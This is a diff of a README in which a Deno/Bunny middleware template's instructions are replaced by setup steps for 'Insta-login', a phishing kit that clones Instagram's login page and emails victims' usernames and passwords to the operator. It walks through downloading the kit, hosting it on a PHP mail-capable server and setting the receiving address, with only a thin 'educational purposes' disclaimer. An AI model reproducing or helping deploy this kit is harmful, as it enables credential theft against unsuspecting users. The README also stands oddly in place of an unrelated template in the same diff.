@@ -1,55 +1,51 @@
-# Template: es-user-agent-middleware
+# Insta-login
+Instagram login page clone which sends your victim's credentials through email.</br>
+The webpage works on both **mobile** web browsers & **desktop**.<br/>
 
-This templates demonstrates a basic middleware for Bunny using a local `Deno`.
 
-> You do not want to use Deno? Feel free to use something else, [here](https://bunny.net) is a full
-> fledged example with `node` instead!
+❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.
+You are solely responsible for your actions, that's obviously not me.**<br/>
+</br>
+</br>
 
-## Setup
+## 🚀 Getting started
 
-To run this example you'll need to have a valid
-[Deno](https://docs.deno.com/runtime/manual/getting_started/installation/) installation.
+* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)
 
-When you have the `deno` binary available, you should be able to run the `check`
-task which is the task ensuring everything is compiling fine.
+* Extract the zip and upload the website on your hosting server
 
-```
-# A tiny lint just to be sure!
-deno task lint
+  - Here I am using a free hosting service, that supports - PHP Version Selection and
+ PHP mail() Features
 
-# We ensure everything is type compliant!
-deno task check
-```
 
-We also use `pnpm` to use `changeset`.
+![image](https://github.com/Abhijeetbyte/Insta-login/assets/80936610/cebdace5-114a-4a3c-bc5b-31030b8a3547)
 
-## Changeset
 
-This template uses [changeset](https://github.com/changesets/changesets) for 
-version management. Changeset helps track and document changes in your project, 
-making it easier to manage releases and generate changelogs.
+* Change receiving email address</br>
 
-When you make changes to the project, you should create a changeset to describe
-those changes:
+  - ![img](images/email-php_LI.jpg)
+</br>
 
-1. Run the following command:
-   ```
-   pnpm changeset
-   ```
-2. Follow the prompts to select the type of change (major, minor, or patch) and provide a brief description.
-3. Commit the generated changeset file along with your code changes.
+### Webpage 
+![Webpage](images/webpage-preview.png)
 
-This process ensures that all modifications are properly documented and 
-versioned, facilitating smoother releases and better communication about 
-project updates.
+</br>
 
-When you merge a pull request that includes a changeset, it will automatically 
-create an associated pull request to release your changes. 
+* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
 
-This new pull request will trigger the release process of the script to your
-PullZone in Bunny.
+  - ![img](images/received-email.png)
+ 
 
-> This behavior is disabled by default, every pushes on main are now pushed to
-> Bunny directly.
-> You can enable this pattern again by updating this
-> [action](./.github/workflows/on-merge.yml)
+<br/>
+
+
+**Important Note:**
+
+This example demonstrates a highly unethical practice of phishing, which is illegal and punishable by law. Unauthorized collection of personal data can lead to severe legal consequences, including imprisonment and substantial fines. This information is provided solely for educational purposes to understand and recognize phishing tactics. Always use your technical skills responsibly and legally.
+
+
+
+
+
+
+
